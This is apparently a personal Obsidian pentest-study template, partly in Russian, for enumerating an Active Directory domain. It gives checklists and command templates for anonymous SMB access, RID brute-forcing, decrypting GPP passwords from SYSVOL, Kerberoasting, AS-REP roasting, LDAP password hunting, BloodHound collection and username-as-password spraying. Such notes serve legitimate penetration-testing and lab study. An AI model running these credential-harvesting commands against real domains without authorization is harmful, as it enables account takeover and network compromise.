---
icon: 🗒
target:
- ""
createdAt: "{{DATE}}"
imageNameKey: nota_<% tp.file.title.split(" ").join("_").toLowerCase() %>
tags: 
NoteRel:
---
# AD Enum
- [ ] Проверить Guest User в SMB
- [ ] Проверить возможность читать/писать в SMB shares
- [ ] Поиск по паролям GPP
- [ ] Anonymous Bind в LDAP
- [ ] Kerberoasting
- [ ] ASP-REP Roasting

## 🧠 Вопросы для проверки после enumeration
- [ ] Есть ли пользователь с SPN, который не является `krbtgt`?
- [ ] Есть ли пользователь без предварительной аутентификации (уязвим к AS-REP)?
- [ ] GPP с паролем?
- [ ] Есть ли shares с правом записи?
- [ ] Есть ли интересные группы (Domain Admins, Backup Operators)?
- [ ] Были ли enumeration Trusts или нескольких доменов?
- [ ] DNS указывает на один хост?

## Другие
- [ ] Полирование паролей с использованием имени пользователя как пароля в нескольких вариантах: все строки нижнего регистра, все строки верхнего регистра, первая буква заглавная и т.д.
- [ ] Всегда тестируйте доступ к MSSQL, если у вас есть учетные данные пользователя, проверьте примечание в другом Obsidian.

# Domain
```

```

# No-Login Enumeration

### nmap 
```

```
### enum4linux
```
enum4linux-ng -A <IP>

```


## SMB (445)
- Анонимный доступ?
- Секретные файлы в shares?
### smbmap 
```
smbmap -H <IP> -u '' -p ''
```

### SMBClient
```
smbclient -L //<IP>/ -N
smbclient //IP/SHARE -N

```

### Rid Bruteforce
```
nxc smb <IP> --rid-brute
```


# Logged Enumeration

## SMB (445)
- Анонимный доступ?
- Секретные файлы в shares?
```
smbmap -H <IP> -u <user> -p <pass> --shares
smbclient //IP/share -U <user>

```

## GPP Credentials
```
smbclient //IP/SYSVOL -U <user> 

# Перейдите к: /Policies/<policy_id>/Machine/Preferences/Groups.xml
# Искать cpassword

gpp-decrypt <cpassword>
```

## Kerberoasting
```js
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request

```
## ASPRoasting
```js
GetNPUsers.py <domain>/<user>:<pass> -dc-ip <IP> -no-pass

```


## LDAP
- проверить, есть ли пароль или что-то похожее на пароль в информации пользователей в LDAP.

```
ldapsearch -x -H ldap://<IP> -D <user>@<domain> -w <pass> -b "dc=dominio,dc=local"
```

## bloodhound

bloodhound-python
```
bloodhound-python -u <user> -p <pass> -d <domain> -dc-ip <IP> -c all
```

nxc
```
 nxc ldap <ip> -u <user> -p <pass> --bloodhound --collection all --dns-server <ip>
```
